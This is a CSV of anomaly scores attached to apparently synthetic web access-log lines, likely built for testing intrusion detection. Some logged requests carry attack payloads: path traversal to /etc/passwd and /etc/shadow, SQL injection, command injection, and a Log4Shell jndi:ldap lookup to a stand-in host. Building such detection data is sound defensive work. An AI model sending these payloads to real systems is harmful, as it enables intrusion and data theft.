score_content,score_session,score_fused,score_fused_norm,line
29.23698616027832,,29.23698616027832,29.23698616027832,52.124.184.50 - - [10/Jan/2025:12:43:28 +0000] "POST /search?q=router HTTP/1.1" 304 5399 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
46.42289733886719,,46.42289733886719,46.42289733886719,154.22.209.76 - - [10/Jan/2025:12:43:30 +0000] "HEAD /api/products HTTP/1.1" 200 9096 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
44.67918014526367,,44.67918014526367,44.67918014526367,116.229.27.74 - - [10/Jan/2025:12:43:33 +0000] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 7799 "-" "sqlmap/1.7.2#stable"
74.45782470703125,,74.45782470703125,74.45782470703125,27.25.4.166 - - [10/Jan/2025:12:43:35 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 304 13709 "-" "dirb/2.22"
26.655942916870117,,26.655942916870117,26.655942916870117,229.189.205.222 - - [10/Jan/2025:12:43:35 +0000] "GET /search?q=laptop HTTP/1.1" 304 2103 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.514253616333008,,26.514253616333008,26.514253616333008,151.100.109.71 - - [10/Jan/2025:12:43:38 +0000] "POST /search?q=headphones HTTP/1.1" 200 3959 "-" "Wget/1.21.2 (linux-gnu)"
68.53466033935547,,68.53466033935547,68.53466033935547,196.103.22.69 - - [10/Jan/2025:12:43:40 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 802 "https://news.ycombinator.com/" "dirb/2.22"
11.191402435302734,,11.191402435302734,11.191402435302734,187.117.72.197 - - [10/Jan/2025:12:43:40 +0000] "PUT /wp-login.php HTTP/1.1" 200 12746 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
46.512908935546875,,46.512908935546875,46.512908935546875,223.140.56.5 - - [10/Jan/2025:12:43:41 +0000] "HEAD /profile HTTP/1.1" 200 11514 "https://www.google.com/" "nikto/2.5.0"
93.9359359741211,,93.9359359741211,93.9359359741211,228.101.195.231 - - [10/Jan/2025:12:43:41 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 14195 "https://www.google.com/" "nikto/2.5.0"
23.94890022277832,,23.94890022277832,23.94890022277832,110.139.102.30 - - [10/Jan/2025:12:43:41 +0000] "GET /search?q=headphones HTTP/1.1" 200 8856 "https://www.google.com/" "sqlmap/1.7.2#stable"
29.365283966064453,,29.365283966064453,29.365283966064453,82.130.141.86 - - [10/Jan/2025:12:43:43 +0000] "DELETE /dashboard HTTP/1.1" 301 18281 "https://example.com/" "python-requests/2.31.0"
12.723254203796387,,12.723254203796387,12.723254203796387,186.20.216.25 - - [10/Jan/2025:12:43:44 +0000] "PUT /api/products HTTP/1.1" 200 4711 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
37.50856399536133,,37.50856399536133,37.50856399536133,90.78.128.20 - - [10/Jan/2025:12:43:44 +0000] "PUT /search?q=phone HTTP/1.1" 302 9010 "https://news.ycombinator.com/" "nikto/2.5.0"
30124.337890625,,30124.337890625,30124.337890625,97.11.118.91 - - [10/Jan/2025:12:43:46 +0000] "GET /assets/app.js HTTP/1.1" 401 22 "https://www.google.com/" "nikto/2.5.0"
30136.205078125,,30136.205078125,30136.205078125,145.95.152.152 - - [10/Jan/2025:12:43:47 +0000] "PUT /contact HTTP/1.1" 401 235 "https://news.ycombinator.com/" "python-requests/2.31.0"
48.7266845703125,,48.7266845703125,48.7266845703125,180.45.108.174 - - [10/Jan/2025:12:43:47 +0000] "DELETE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 8155 "https://twitter.com/" "curl/7.85.0"
103.05485534667969,,103.05485534667969,103.05485534667969,83.21.76.247 - - [10/Jan/2025:12:43:49 +0000] "TRACE /login HTTP/1.1" 200 3620 "https://www.google.com/" "dirb/2.22"
48.84048080444336,,48.84048080444336,48.84048080444336,185.105.221.166 - - [10/Jan/2025:12:43:51 +0000] "DELETE /search?q=camera HTTP/1.1" 200 1965 "https://news.ycombinator.com/" "python-requests/2.31.0"
127.62938690185547,,127.62938690185547,127.62938690185547,80.222.61.24 - - [10/Jan/2025:12:43:51 +0000] "TRACE /search?q=headphones HTTP/1.1" 304 13217 "https://news.ycombinator.com/" "nikto/2.5.0"
2.0199294090270996,,2.0199294090270996,2.0199294090270996,64.18.84.143 - - [10/Jan/2025:12:43:51 +0000] "GET /login HTTP/1.1" 201 4547 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.57379674911499,,4.57379674911499,4.57379674911499,249.16.15.115 - - [10/Jan/2025:12:43:52 +0000] "POST /logout HTTP/1.1" 200 7060 "https://www.google.com/" "sqlmap/1.7.2#stable"
30191.1484375,,30191.1484375,30191.1484375,205.146.198.230 - - [10/Jan/2025:12:43:55 +0000] "HEAD /api/user?id=1;DROP TABLE users HTTP/1.1" 401 671 "https://example.com/" "nikto/2.5.0"
26.736658096313477,,26.736658096313477,26.736658096313477,59.239.224.4 - - [10/Jan/2025:12:43:56 +0000] "DELETE /dashboard HTTP/1.1" 200 8152 "-" "python-requests/2.31.0"
68.50885009765625,,68.50885009765625,68.50885009765625,188.13.34.202 - - [10/Jan/2025:12:43:59 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 4692 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9521079063415527,,1.9521079063415527,1.9521079063415527,87.192.169.24 - - [10/Jan/2025:12:44:01 +0000] "GET /contact HTTP/1.1" 200 655 "https://news.ycombinator.com/" "curl/7.85.0"
125.0986328125,,125.0986328125,125.0986328125,8.208.134.149 - - [10/Jan/2025:12:44:04 +0000] "TRACE /search?q=phone HTTP/1.1" 200 19246 "https://twitter.com/" "curl/7.85.0"
93.9493637084961,,93.9493637084961,93.9493637084961,141.253.154.125 - - [10/Jan/2025:12:44:06 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 393 "https://example.com/" "sqlmap/1.7.2#stable"
12.899368286132812,,12.899368286132812,12.899368286132812,164.236.108.143 - - [10/Jan/2025:12:44:09 +0000] "PUT /about HTTP/1.1" 200 410 "https://example.com/" "sqlmap/1.7.2#stable"
46.5395393371582,,46.5395393371582,46.5395393371582,23.118.109.6 - - [10/Jan/2025:12:44:10 +0000] "HEAD /logout HTTP/1.1" 200 467 "https://twitter.com/" "sqlmap/1.7.2#stable"
46.588905334472656,,46.588905334472656,46.588905334472656,169.141.98.232 - - [10/Jan/2025:12:44:13 +0000] "HEAD /about HTTP/1.1" 200 11883 "-" "python-requests/2.31.0"
2.9536681175231934,,2.9536681175231934,2.9536681175231934,236.61.7.83 - - [10/Jan/2025:12:44:13 +0000] "POST /.git/config HTTP/1.1" 200 19211 "-" "python-requests/2.31.0"
30147.408203125,,30147.408203125,30147.408203125,144.217.107.228 - - [10/Jan/2025:12:44:15 +0000] "GET /search?q=headphones HTTP/1.1" 403 1499 "https://twitter.com/" "curl/7.85.0"
26.8195743560791,,26.8195743560791,26.8195743560791,112.2.149.51 - - [10/Jan/2025:12:44:17 +0000] "DELETE /logout HTTP/1.1" 200 2670 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
46.320457458496094,,46.320457458496094,46.320457458496094,208.46.19.141 - - [10/Jan/2025:12:44:18 +0000] "HEAD /server-status HTTP/1.1" 200 9118 "https://news.ycombinator.com/" "nikto/2.5.0"
37.462440490722656,,37.462440490722656,37.462440490722656,181.106.253.248 - - [10/Jan/2025:12:44:21 +0000] "PUT /search?q=camera HTTP/1.1" 302 1735 "-" "Wget/1.21.2 (linux-gnu)"
48.871028900146484,,48.871028900146484,48.871028900146484,96.20.6.31 - - [10/Jan/2025:12:44:23 +0000] "DELETE /api/product?id=123 HTTP/1.1" 200 6147 "https://www.google.com/" "sqlmap/1.7.2#stable"
2.670783758163452,,2.670783758163452,2.670783758163452,250.94.122.254 - - [10/Jan/2025:12:44:23 +0000] "POST /..%2f..%2fetc%2fpasswd HTTP/1.1" 204 2962 "https://www.google.com/" "dirb/2.22"
26.603845596313477,,26.603845596313477,26.603845596313477,14.236.44.152 - - [10/Jan/2025:12:44:25 +0000] "POST /search?q=monitor HTTP/1.1" 200 12883 "https://news.ycombinator.com/" "curl/7.85.0"
30147.369140625,,30147.369140625,30147.369140625,17.80.217.35 - - [10/Jan/2025:12:44:28 +0000] "GET /search?q=camera HTTP/1.1" 400 1104 "https://example.com/" "nikto/2.5.0"
30125.779296875,,30125.779296875,30125.779296875,191.108.62.110 - - [10/Jan/2025:12:44:31 +0000] "GET /profile HTTP/1.1" 404 1147 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
93.87092590332031,,93.87092590332031,93.87092590332031,105.44.106.243 - - [10/Jan/2025:12:44:31 +0000] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 7544 "-" "dirb/2.22"
7.084747791290283,,7.084747791290283,7.084747791290283,230.107.73.17 - - [10/Jan/2025:12:44:31 +0000] "POST /dashboard HTTP/1.1" 301 11507 "https://example.com/" "nikto/2.5.0"
102.9284439086914,,102.9284439086914,102.9284439086914,162.6.180.160 - - [10/Jan/2025:12:44:34 +0000] "TRACE /api/products HTTP/1.1" 200 11576 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
2.2726943492889404,,2.2726943492889404,2.2726943492889404,88.161.227.247 - - [10/Jan/2025:12:44:37 +0000] "GET / HTTP/1.1" 204 15089 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
46.55367660522461,,46.55367660522461,46.55367660522461,54.233.88.122 - - [10/Jan/2025:12:44:39 +0000] "HEAD /logout HTTP/1.1" 200 12759 "-" "Wget/1.21.2 (linux-gnu)"
34.923152923583984,,34.923152923583984,34.923152923583984,54.251.155.39 - - [10/Jan/2025:12:44:40 +0000] "PUT /search?q=camera HTTP/1.1" 200 18761 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
125.0528793334961,,125.0528793334961,125.0528793334961,68.52.19.123 - - [10/Jan/2025:12:44:43 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 7352 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
68.49093627929688,,68.49093627929688,68.49093627929688,116.163.87.138 - - [10/Jan/2025:12:44:46 +0000] "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 11750 "https://www.google.com/" "nikto/2.5.0"
24.041736602783203,,24.041736602783203,24.041736602783203,231.49.175.108 - - [10/Jan/2025:12:44:48 +0000] "GET /search?q=camera HTTP/1.1" 200 13527 "https://news.ycombinator.com/" "curl/7.85.0"
46.3848762512207,,46.3848762512207,46.3848762512207,204.26.26.69 - - [10/Jan/2025:12:44:50 +0000] "HEAD /phpmyadmin HTTP/1.1" 200 4245 "https://twitter.com/" "dirb/2.22"
103.01644897460938,,103.01644897460938,103.01644897460938,35.65.8.165 - - [10/Jan/2025:12:44:52 +0000] "TRACE /logout HTTP/1.1" 200 3580 "https://news.ycombinator.com/" "nikto/2.5.0"
30126.033203125,,30126.033203125,30126.033203125,148.193.168.150 - - [10/Jan/2025:12:44:55 +0000] "GET / HTTP/1.1" 403 1073 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.12502969801425934,,0.12502969801425934,0.12502969801425934,194.169.251.70 - - [10/Jan/2025:12:44:56 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 9678 "https://news.ycombinator.com/" "dirb/2.22"
5.774197101593018,,5.774197101593018,5.774197101593018,66.166.141.15 - - [10/Jan/2025:12:44:59 +0000] "POST /.env HTTP/1.1" 302 3875 "https://www.google.com/" "curl/7.85.0"
12.79744815826416,,12.79744815826416,12.79744815826416,113.12.122.49 - - [10/Jan/2025:12:45:00 +0000] "PUT /profile HTTP/1.1" 200 2962 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
71.77326202392578,,71.77326202392578,71.77326202392578,253.252.192.58 - - [10/Jan/2025:12:45:00 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 201 2223 "https://example.com/" "nikto/2.5.0"
48.869728088378906,,48.869728088378906,48.869728088378906,114.164.36.56 - - [10/Jan/2025:12:45:00 +0000] "DELETE /api/product?id=123 HTTP/1.1" 200 5838 "https://www.google.com/" "nikto/2.5.0"
2.292466163635254,,2.292466163635254,2.292466163635254,106.139.53.4 - - [10/Jan/2025:12:45:01 +0000] "GET / HTTP/1.1" 200 19782 "-" "dirb/2.22"
11130.681640625,,11130.681640625,11130.681640625,2.83.158.23 - - [10/Jan/2025:12:45:02 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 500 712 "https://twitter.com/" "curl/7.85.0"
0.3895736634731293,,0.3895736634731293,0.3895736634731293,24.72.210.232 - - [10/Jan/2025:12:45:03 +0000] "GET /index.html HTTP/1.1" 200 14250 "https://www.google.com/" "nikto/2.5.0"
0.3436978757381439,,0.3436978757381439,0.3436978757381439,205.135.9.66 - - [10/Jan/2025:12:45:06 +0000] "GET /index.html HTTP/1.1" 200 2377 "-" "nikto/2.5.0"
26.911701202392578,,26.911701202392578,26.911701202392578,73.150.50.190 - - [10/Jan/2025:12:45:09 +0000] "DELETE /admin HTTP/1.1" 200 17583 "https://www.google.com/" "dirb/2.22"
2.2866017818450928,,2.2866017818450928,2.2866017818450928,207.149.148.245 - - [10/Jan/2025:12:45:12 +0000] "GET / HTTP/1.1" 201 18332 "-" "sqlmap/1.7.2#stable"
4.725845813751221,,4.725845813751221,4.725845813751221,150.75.188.155 - - [10/Jan/2025:12:45:15 +0000] "GET /admin HTTP/1.1" 304 13915 "https://example.com/" "nikto/2.5.0"
4.456943035125732,,4.456943035125732,4.456943035125732,185.134.169.170 - - [10/Jan/2025:12:45:17 +0000] "POST /api/products HTTP/1.1" 200 7108 "https://twitter.com/" "dirb/2.22"
68.63129425048828,,68.63129425048828,68.63129425048828,190.73.115.197 - - [10/Jan/2025:12:45:19 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 11751 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30191.09375,,30191.09375,30191.09375,148.180.173.84 - - [10/Jan/2025:12:45:19 +0000] "HEAD /search?q=%27+OR+1%3D1+-- HTTP/1.1" 403 308 "https://example.com/" "nikto/2.5.0"
46.5704231262207,,46.5704231262207,46.5704231262207,194.118.178.121 - - [10/Jan/2025:12:45:19 +0000] "HEAD /logout HTTP/1.1" 201 18958 "https://example.com/" "dirb/2.22"
46.610023498535156,,46.610023498535156,46.610023498535156,11.165.57.241 - - [10/Jan/2025:12:45:22 +0000] "HEAD /about HTTP/1.1" 200 18763 "https://example.com/" "curl/7.85.0"
70.15377807617188,,70.15377807617188,70.15377807617188,102.252.1.79 - - [10/Jan/2025:12:45:22 +0000] "OPTIONS /../../etc/passwd HTTP/1.1" 200 2257 "https://twitter.com/" "python-requests/2.31.0"
26.707775115966797,,26.707775115966797,26.707775115966797,127.253.232.16 - - [10/Jan/2025:12:45:24 +0000] "DELETE /api/products HTTP/1.1" 200 886 "https://twitter.com/" "curl/7.85.0"
125.09542846679688,,125.09542846679688,125.09542846679688,216.187.108.57 - - [10/Jan/2025:12:45:25 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 1480 "https://example.com/" "python-requests/2.31.0"
34.82219696044922,,34.82219696044922,34.82219696044922,170.52.170.73 - - [10/Jan/2025:12:45:27 +0000] "PUT /search?q=headphones HTTP/1.1" 200 11041 "https://news.ycombinator.com/" "nikto/2.5.0"
93.9833755493164,,93.9833755493164,93.9833755493164,110.180.9.103 - - [10/Jan/2025:12:45:28 +0000] "OPTIONS /api/user?id=1;DROP TABLE users HTTP/1.1" 200 272 "https://twitter.com/" "python-requests/2.31.0"
2.918234348297119,,2.918234348297119,2.918234348297119,213.221.106.74 - - [10/Jan/2025:12:45:31 +0000] "GET /assets/app.js HTTP/1.1" 301 13874 "https://www.google.com/" "python-requests/2.31.0"
4.506218910217285,,4.506218910217285,4.506218910217285,101.219.131.98 - - [10/Jan/2025:12:45:31 +0000] "GET /dashboard HTTP/1.1" 302 4364 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.964613914489746,,2.964613914489746,2.964613914489746,28.159.13.47 - - [10/Jan/2025:12:45:31 +0000] "GET /assets/app.css HTTP/1.1" 304 17430 "https://example.com/" "curl/7.85.0"
29.194276809692383,,29.194276809692383,29.194276809692383,86.141.189.216 - - [10/Jan/2025:12:45:34 +0000] "POST /search?q=laptop HTTP/1.1" 302 4753 "https://twitter.com/" "nikto/2.5.0"
68.65435028076172,,68.65435028076172,68.65435028076172,28.29.206.195 - - [10/Jan/2025:12:45:36 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 19477 "https://twitter.com/" "nikto/2.5.0"
93.9598159790039,,93.9598159790039,93.9598159790039,57.44.116.197 - - [10/Jan/2025:12:45:37 +0000] "OPTIONS /search?q=router HTTP/1.1" 200 15002 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
71.89530181884766,,71.89530181884766,71.89530181884766,36.254.100.209 - - [10/Jan/2025:12:45:40 +0000] "OPTIONS /contact HTTP/1.1" 201 8439 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
4.512034893035889,,4.512034893035889,4.512034893035889,103.130.218.78 - - [10/Jan/2025:12:45:43 +0000] "GET /dashboard HTTP/1.1" 301 10721 "https://twitter.com/" "curl/7.85.0"
23.8709716796875,,23.8709716796875,23.8709716796875,145.114.129.142 - - [10/Jan/2025:12:45:44 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 3849 "https://example.com/" "curl/7.85.0"
1.8609898090362549,,1.8609898090362549,1.8609898090362549,51.63.234.193 - - [10/Jan/2025:12:45:44 +0000] "GET /api/products HTTP/1.1" 200 1119 "-" "dirb/2.22"
48.891075134277344,,48.891075134277344,48.891075134277344,50.179.93.155 - - [10/Jan/2025:12:45:46 +0000] "DELETE /search?q=laptop HTTP/1.1" 200 15919 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
93.93408203125,,93.93408203125,93.93408203125,110.107.113.166 - - [10/Jan/2025:12:45:47 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 200 2062 "-" "Wget/1.21.2 (linux-gnu)"
26.63428497314453,,26.63428497314453,26.63428497314453,238.120.64.186 - - [10/Jan/2025:12:45:48 +0000] "POST /search?q=camera HTTP/1.1" 200 15666 "https://twitter.com/" "curl/7.85.0"
26.839357376098633,,26.839357376098633,26.839357376098633,251.196.29.30 - - [10/Jan/2025:12:45:50 +0000] "DELETE /profile HTTP/1.1" 200 18501 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
48.95686340332031,,48.95686340332031,48.95686340332031,64.108.76.61 - - [10/Jan/2025:12:45:51 +0000] "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 11998 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.3515743613243103,,0.3515743613243103,0.3515743613243103,56.95.147.50 - - [10/Jan/2025:12:45:54 +0000] "GET /index.html HTTP/1.1" 200 4517 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
26.61573028564453,,26.61573028564453,26.61573028564453,44.69.155.94 - - [10/Jan/2025:12:45:55 +0000] "POST /search?q=router HTTP/1.1" 200 10199 "https://www.google.com/" "curl/7.85.0"
70.30055236816406,,70.30055236816406,70.30055236816406,108.35.107.32 - - [10/Jan/2025:12:45:57 +0000] "OPTIONS /wp-login.php HTTP/1.1" 200 17335 "https://example.com/" "curl/7.85.0"
68.57201385498047,,68.57201385498047,68.57201385498047,176.36.103.253 - - [10/Jan/2025:12:45:58 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 16779 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
34.87409973144531,,34.87409973144531,34.87409973144531,75.151.54.56 - - [10/Jan/2025:12:46:01 +0000] "PUT /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 1088 "https://www.google.com/" "curl/7.85.0"
48.897865295410156,,48.897865295410156,48.897865295410156,37.18.177.254 - - [10/Jan/2025:12:46:02 +0000] "DELETE /api/product?id=123 HTTP/1.1" 200 13345 "https://www.google.com/" "sqlmap/1.7.2#stable"
2.8503081798553467,,2.8503081798553467,2.8503081798553467,228.124.200.3 - - [10/Jan/2025:12:46:02 +0000] "GET /assets/app.css HTTP/1.1" 301 1341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
68.57945251464844,,68.57945251464844,68.57945251464844,95.90.247.218 - - [10/Jan/2025:12:46:02 +0000] "HEAD /api/product?id=123 HTTP/1.1" 200 14071 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.038097381591797,,24.038097381591797,24.038097381591797,132.110.170.36 - - [10/Jan/2025:12:46:05 +0000] "GET /search?q=monitor HTTP/1.1" 200 19485 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
71.13044738769531,,71.13044738769531,71.13044738769531,136.59.187.80 - - [10/Jan/2025:12:46:07 +0000] "HEAD /search?q=router HTTP/1.1" 302 4729 "https://twitter.com/" "curl/7.85.0"
127.7630844116211,,127.7630844116211,127.7630844116211,36.64.87.107 - - [10/Jan/2025:12:46:10 +0000] "TRACE /search?q=ssd HTTP/1.1" 304 7988 "https://www.google.com/" "curl/7.85.0"
101.30691528320312,,101.30691528320312,101.30691528320312,220.61.207.105 - - [10/Jan/2025:12:46:11 +0000] "TRACE /cgi-bin/test.cgi HTTP/1.1" 200 16219 "-" "nikto/2.5.0"
93.9666976928711,,93.9666976928711,93.9666976928711,152.196.58.5 - - [10/Jan/2025:12:46:12 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 200 11490 "https://twitter.com/" "python-requests/2.31.0"
26.640087127685547,,26.640087127685547,26.640087127685547,253.217.17.118 - - [10/Jan/2025:12:46:13 +0000] "POST /search?q=laptop HTTP/1.1" 200 17609 "https://www.google.com/" "dirb/2.22"
102.9395751953125,,102.9395751953125,102.9395751953125,242.91.139.111 - - [10/Jan/2025:12:46:16 +0000] "TRACE /dashboard HTTP/1.1" 200 10811 "https://example.com/" "python-requests/2.31.0"
48.875057220458984,,48.875057220458984,48.875057220458984,114.203.229.45 - - [10/Jan/2025:12:46:19 +0000] "DELETE /search?q=router HTTP/1.1" 200 11037 "https://example.com/" "nikto/2.5.0"
